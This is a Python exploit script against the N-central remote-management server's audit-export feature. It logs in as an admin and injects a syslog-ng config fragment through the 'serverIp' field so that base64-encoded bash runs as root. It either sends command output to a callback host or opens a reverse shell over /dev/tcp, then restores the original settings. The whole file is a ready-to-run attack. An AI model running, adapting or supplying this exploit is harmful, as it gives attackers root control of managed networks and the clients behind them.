#!/usr/bin/env python3
import argparse
import base64
import getpass
import os
import socket
import threading
import time

import requests
import urllib3


def main():
    p = argparse.ArgumentParser(description="N-central Audit Export syslog-ng root RCE")
    p.add_argument("--target", default="https://192.168.1.14:8443")
    p.add_argument("--username", default="productadmin@n-able.com")
    p.add_argument("--password", default=os.getenv("PRODUCTADMIN_PASSWORD"))
    p.add_argument("--command", default="/usr/bin/id")
    p.add_argument("--callback-host", required=True)
    p.add_argument("--listen-host", default="0.0.0.0")
    p.add_argument("--callback-port", type=int, default=9005)
    p.add_argument("--lhost")
    p.add_argument("--lport", type=int)
    a = p.parse_args()
    password = a.password or getpass.getpass("Password: ")
    reverse = bool(a.lhost or a.lport)
    if reverse and not (a.lhost and a.lport):
        p.error("--lhost and --lport must be supplied together")

    received = []
    listener = None
    if not reverse:
        listener = socket.socket()
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((a.listen_host, a.callback_port))
        listener.listen(1)

        def accept():
            conn, _ = listener.accept()
            with conn:
                received.append(conn.recv(65535).decode(errors="replace"))

        threading.Thread(target=accept, daemon=True).start()

    if reverse:
        effect = f"/bin/bash -c 'bash -i >& /dev/tcp/{a.lhost}/{a.lport} 0>&1'"
    else:
        command64 = base64.b64encode(a.command.encode()).decode()
        effect = (
            f"out=$(echo {command64}|base64 -d|/bin/bash 2>&1);"
            f"exec 3<>/dev/tcp/{a.callback_host}/{a.callback_port};printf '%s\\n' \"$out\" >&3"
        )
    shell64 = base64.b64encode((effect + ";exec /bin/cat >/dev/null").encode()).decode()
    injected = (
        '127.0.0.1"\n                port(514)\n        );\n};\n'
        'destination d_exec { program("/bin/bash -c \'echo '
        + shell64
        + '|base64 -d|/bin/bash\'"); };\n'
        'log { source(s_ncentral); destination(d_exec); };\n'
        'destination d_balance {\n        network(\n                "127.0.0.1'
    )

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    target = a.target.rstrip("/")
    s = requests.Session()
    s.verify = False
    s.get(target + "/login", timeout=30)
    login = s.post(
        target + "/loginLoginAction.action",
        data={"username": a.username, "password": password, "customerId": "1", "soName": ""},
        allow_redirects=False,
        timeout=30,
    )
    if login.status_code != 302:
        raise SystemExit(f"login={login.status_code}")
    s.get(target + "/IndexAction.action", timeout=30)
    endpoint = target + "/dms/rest/nac/audit-export"
    original = s.get(endpoint, params={"customerId": 1}, timeout=30).json()
    payload = {
        "customerId": 1,
        "exportEnabled": True,
        "serverIp": injected,
        "serverPort": 514,
        "tlsEnabled": False,
        "tlsCertificate": None,
        "email": "",
    }
    save = s.post(endpoint + "/save", json=payload, timeout=90)
    print(f"login={login.status_code}")
    print(f"save={save.status_code}")
    if not reverse:
        for _ in range(120):
            if received:
                break
            time.sleep(0.25)
        if received:
            print(received[0].strip())
        listener.close()
    restore = s.post(endpoint + "/save", json=original, timeout=90)
    print(f"restore={restore.status_code}")


if __name__ == "__main__":
    main()
